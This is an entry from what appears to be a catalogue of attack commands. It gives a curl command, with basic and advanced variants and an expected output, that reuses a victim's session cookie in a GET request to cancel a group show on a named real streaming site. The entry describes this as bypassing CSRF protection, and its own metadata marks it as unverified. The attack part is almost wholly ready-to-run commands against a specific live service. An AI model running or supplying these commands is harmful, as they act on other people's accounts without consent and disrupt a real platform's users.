---
id: cmd-uuid-2
data: >-
  curl -X GET -H "Cookie: auth_token=victim_session_cookie"
  https://chaturbate.com/tipping/group_show_cancel/broadcaster_username/
tags:
  - web
  - exploit
  - csrf
  - bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:29.603Z'
verified: false
validated: true
submitted: true
---
# curl-get-bypass-cancel

## Command

```bash
curl -X GET -H "Cookie: auth_token=victim_session_cookie" https://chaturbate.com/tipping/group_show_cancel/broadcaster_username/
```

## Description

This command simulates a GET request to bypass CSRF on Chaturbate's cancellation endpoint, exploiting the lack of token validation to cancel a show using the victim's session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP GET method | Yes |
| `-H "Cookie: ..."` | Victim's session cookie for auth | Yes |
| URL | Endpoint with broadcaster username | Yes |

## Examples

### Basic Usage

```bash
curl -X GET -H "Cookie: auth_token=xyz789" https://chaturbate.com/tipping/group_show_cancel/test_user/
```

### Advanced Usage

```bash
curl -X GET -H "Cookie: auth_token=xyz789" -v https://chaturbate.com/tipping/group_show_cancel/test_user/
```

## Expected Output

HTTP 200 or redirect confirming cancellation without CSRF prompt, as GET bypasses validation.

## Related

- [[Related Procedure|procedures/Bypass-CSRF-with-GET-Request-to-Cancel-Show]]
